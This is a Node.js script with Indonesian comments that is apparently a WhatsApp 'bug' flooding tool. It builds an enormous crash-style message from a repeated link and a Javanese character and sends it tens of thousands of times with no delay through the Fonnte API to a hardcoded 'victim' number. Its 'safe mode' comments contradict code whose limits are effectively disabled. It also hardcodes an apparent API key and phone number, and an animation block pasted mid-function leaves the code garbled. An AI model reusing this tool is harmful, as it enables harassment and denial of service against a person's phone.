#!/usr/bin/env node
// isi scriptmu selanjutnya...
console.log("bug tool ready!");
// send_10_same_safely.js
// Kirim N pesan yang sama (safe mode) via Fonnte API.
// -------------------------------------------------
// USAGE:
//   export FONNTE_API_KEY="your_token_here"
//   export TARGET_NUMBER="6281234567890"
//   node send_10_same_safely.js
//
// Skrip ini meminta konfirmasi manual sebelum kirim.
// Jangan gunakan ke nomor orang lain.

const axios = require('axios');

// Ambil token & target dari env (aman). 
const API_KEY =' cLREhDbXmk9me7b9hSQJ';
const TARGET_NUMBER =' 6283137606019';

if (!API_KEY || !TARGET_NUMBER) {
  console.error('ERROR: Set FONNTE_API_KEY dan TARGET_NUMBER sebagai environment variable.');
  console.error('Contoh: export FONNTE_API_KEY="xxxx" && export TARGET_NUMBER="6281234567890"');
  process.exit(1);
}

// ========== KONFIGURASI ==========
const UNIT = 'Https://t.me/malvinsock" + "ꦾ".';          // unit yang diulang untuk isi pesan
const REPEAT = 99999;        // berapa kali unit diulang untuk membentuk pesan (ubah jika perlu)
const MAX_CHARS_PER_MSG = 999999; // max chars per message (split jika lebih)
const DELAY_MS = 0;      // jeda antar pengiriman pesan (ms)
const TIMES_EACH = 10000;      // berapa kali setiap chunk dikirim (default 10)
const ABSOLUTE_MAX_TOTAL_SEND = 999999999999999999999999999999999999; // safety: limit total pesan terkirim (chunkCount * TIMES_EACH)
// ==================================

function sleep(ms){ return new Promise(r => setTimeout(r, ms)); }

function buildRepeated(unit, count) {
  // safety: cap count ke angka wajar (jika ingin, bisa ubah)
  const safeCount = Math.min(count, 9999999999999000000000000); 
  return unit.repeat(safeCount);
}

function splitText(text, maxLen) {
  const chunks = [];
  for (let i = 0; i < text.length; i += maxLen) {
    chunks.push(text.slice(i, i + maxLen));
  }
  return chunks;
}

(async () => {
  console.log('🔧 Membangun pesan dari unit dan repeat...');
  const text = buildRepeated(UNIT, REPEAT);
  const chunks = splitText(text, MAX_CHARS_PER_MSG);

  const totalToSend = chunks.length * TIMES_EACH;
  if (totalToSend > ABSOLUTE_MAX_TOTAL_SEND) {
    console.error(`Safety stop: total pesan (${totalToSend}) melebihi batas aman (${ABSOLUTE_MAX_TOTAL_SEND}).`);
    console.error('Kurangi REPEAT, MAX_CHARS_PER_MSG, atau TIMES_EACH lalu jalankan lagi.');
    process.exit(1);
  }
  // bot_anim.js
const sleep = ms => new Promise(r => setTimeout(r, ms));
const cyan = '\x1b[36m';
const yellow = '\x1b[33m';
const magenta = '\x1b[35m';
const reset = '\x1b[0m';

(async () => {
  const frames = [
    `${cyan}l${reset}`,
    `${cyan}lo${reset}`,
    `${cyan}load${reset}`,
    `${magenta}loadi${reset}`,
    `${yellow}loadin${reset}`,
    `${cyan}loading${reset}`,
    `${cyan}loading${reset}`,
    `${cyan}loading${reset}`,
    `${cyan}loading${reset}`,
    `${cyan}loading${reset}`,
    `${cyan}loading${reset}`,
    `${cyan}•${reset}`,
    `${cyan}•••${reset}`,
    `${cyan}••••${reset}`,
    `${cyan}••••••••••••••••••${reset}`,
    `${cyan}••••••••••••••••••${reset}`,
    `${cyan}••••••••••••••••••${reset}`,
    `${cyan}•${reset}`,
  ];

  console.clear();
  for (const f of frames) {
    console.clear();
    console.log(f);
    await sleep(300);
  }

  console.clear();
  console.log(`${cyan}
██████╗  ██████╗ ████████╗
██╔══██╗██╔═══██╗╚══██╔══╝
██████╔╝██║   ██║   ██║   
██╔══██╗██║   ██║   ██║   
██████╔╝╚██████╔╝   ██║   
╚═════╝  ╚═════╝    ╚═╝   
${reset}`);

  console.log(`${yellow}⚡ Lawliet Bot by Rifat ⚡${reset}`);
  console.log(`________________________________`);
  console.log(`pembuat:RIFAT`);
  console.log('by:t.me/RIFATZoir');
  console.log(`informasi bot:怒りと報復の巣窟`);
  console.log(`©2025 rifat`);
  console.log(`________________________________`);
  console.log(`Panjang pesan total: ${text.length} karakter`);
  console.log(`Chunk count: ${chunks.length} (max ${MAX_CHARS_PER_MSG} chars/chunk)`);
  console.log(`Akan mengirim setiap chunk sebanyak ${TIMES_EACH} kali -> total pesan = ${totalToSend}`);
  console.log('⚠️ Hy i bot termux by rifat,after filling in the victims number ( type YES and Enter)');})();

  const confirm = await new Promise(r => {
    process.stdin.once('data', d => r(String(d).trim()));
  });
  if (confirm.toLowerCase() !== 'yes') {
    console.log('Dibatalkan oleh pengguna.');
    process.exit(0);
  }

  // kirim loop: untuk setiap chunk, kirim TIMES_EACH kali
  for (let ci = 0; ci < chunks.length; ci++) {
    const chunk = chunks[ci];
    for (let t = 0; t < TIMES_EACH; t++) {
      const idx = ci * TIMES_EACH + (t + 1);
      console.log(`📨 Mengirim bug ${ci+1}/${chunks.length} (repeat #${t+1}/${TIMES_EACH}) len=${chunk.length} -> (${idx}/${totalToSend})`);
      try {
        const res = await axios.post('https://api.fonnte.com/send', {
          target: TARGET_NUMBER,
          message: chunk
        }, {
          headers: { Authorization: API_KEY }
        });
        console.log('   respon:', res.data.status ? 'OK' : 'FAILED', res.data.reason || '');
        if (!res.data.status) {
          // jika server tolak, beri peringatan tapi lanjutkan (atau exit jika mau stricter)
          console.warn('   Server menolak pesan. Hentikan jika perlu.');
        }
      } catch (err) {
        console.error('   Error request:', err.response?.data || err.message);
        // jika error jaringan/403 dll, kita hentikan untuk menghindari spam
        console.error('   Menghentikan pengiriman karena error.');
        process.exit(1);
      }

      // sleep antar pengiriman
      if (!(ci === chunks.length - 1 && t === TIMES_EACH - 1)) {
        await sleep(DELAY_MS);
      }
    }
  }

  console.log('✅ Proses selesai. target dijamin c1 cik😹 (nomor target).');
})();
